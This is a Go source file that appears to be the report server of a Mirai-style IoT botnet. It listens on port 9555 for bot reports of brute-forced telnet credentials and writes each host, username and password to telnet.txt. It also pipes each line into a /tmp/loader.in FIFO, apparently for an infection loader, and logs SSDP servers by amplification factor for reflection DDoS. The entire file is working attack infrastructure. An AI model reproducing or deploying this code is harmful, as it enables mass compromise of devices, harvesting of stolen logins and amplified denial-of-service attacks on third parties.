package main
import (
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"time"
)
func main() {
	l, err := net.Listen("tcp", ":9555")
	if err != nil {
		fmt.Println(err)
		return
	}
    for {
        conn, err := l.Accept()
        if err != nil {
            continue
        }
        go handleConnection(conn)
    }
}
func handleConnection(conn net.Conn) {
	defer conn.Close()
    conn.SetDeadline(time.Now().Add(5 * time.Second))
	bufChk, err := readXBytes(conn, 1)
	if err != nil {
		return
	}
	var ipInt uint32
	var portInt uint16
	if bufChk[0] == 0 {
		ipBuf, err := readXBytes(conn, 4)
		if err != nil {
			return
		}
		ipInt = binary.BigEndian.Uint32(ipBuf)
		portBuf, err := readXBytes(conn, 2)
		if err != nil {
			return
		}
		portInt = binary.BigEndian.Uint16(portBuf)
	} else if bufChk[0] == 0xFF {
		ipBuf, err := readXBytes(conn, 4)
		if err != nil {
			return
		}
		ipInt = binary.BigEndian.Uint32(ipBuf)
		portBuf, err := readXBytes(conn, 2)
		if err != nil {
			return
		}
		portInt = binary.BigEndian.Uint16(portBuf)
		ampBuf, err := readXBytes(conn, 4)
		if err != nil {
			return
		}
		amplification := binary.BigEndian.Uint32(ampBuf)
		file, err := os.OpenFile("ssdp_amplifiers.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return
		}
		defer file.Close()
		line := fmt.Sprintf("%d.%d.%d.%d:%d amplification:%d\n", 
			(ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portInt, amplification)
		fmt.Print(line)
		file.WriteString(line)
		return
	} else {
		ipBuf, err := readXBytes(conn, 3)
		if err != nil {
			return
		}
		ipBuf = append(bufChk, ipBuf...)
		ipInt = binary.BigEndian.Uint32(ipBuf)
		portInt = 23
	}
    uLenBuf, err := readXBytes(conn, 1)
	if err != nil {
		return
	}
    ulen := int(uLenBuf[0])
    if ulen <= 0 || ulen > 64 {
        return
    }
    usernameBuf, err := readXBytes(conn, ulen)
    pLenBuf, err := readXBytes(conn, 1)
	if err != nil {
		return
	}
    plen := int(pLenBuf[0])
    if plen < 0 || plen > 64 {
        return
    }
    passwordBuf, err := readXBytes(conn, plen)
	if err != nil {
		return
	}
    file, err := os.OpenFile("telnet.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
        log.Println("scanListen: cannot open output file:", err)
        return
	}
	defer file.Close()
	fmt.Printf("%d.%d.%d.%d:%d %s:%s\n", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portInt, string(usernameBuf), string(passwordBuf))
    line := fmt.Sprintf("%d.%d.%d.%d:%d %s:%s\n", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portInt, string(usernameBuf), string(passwordBuf))
    fmt.Fprint(file, line)
    if fifo, err := os.OpenFile("/tmp/loader.in", os.O_WRONLY, 0600); err == nil {
        defer fifo.Close()
        fifo.WriteString(line)
    }
}
func readXBytes(conn net.Conn, amount int) ([]byte, error) {
    if amount <= 0 {
        return []byte{}, nil
    }
    buf := make([]byte, amount)
	tl := 0
	for tl < amount {
		rd, err := conn.Read(buf[tl:])
		if err != nil || rd <= 0 {
			return nil, errors.New("Failed to read")
		}
		tl += rd
        _ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	}
	return buf, nil
}
